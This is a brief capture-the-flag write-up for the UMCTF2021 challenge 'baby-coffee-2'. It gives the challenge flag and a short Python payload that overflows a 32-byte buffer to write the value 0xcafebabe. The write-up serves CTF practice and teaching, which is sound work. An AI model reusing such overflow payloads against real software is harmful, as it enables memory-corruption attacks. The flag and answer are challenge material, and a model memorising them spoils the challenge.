
# UMCTF2021 - baby-coffee-2

- Write-Up Author: RB916120 \[[MOCTF](https://www.facebook.com/MOCSCTF)\]

- Flag:MOCSCTF{d0_y0u_3nj0y_7h15_c7f_3v3n7?}

## **Question:**
baby-coffee-2
[baby-coffee-2](./bin/latte)
## Write up

---

overflow the buffer with 0xcafebabe
```python
import struct
print 'a'*32+struct.pack('I',0xcafebabe)
```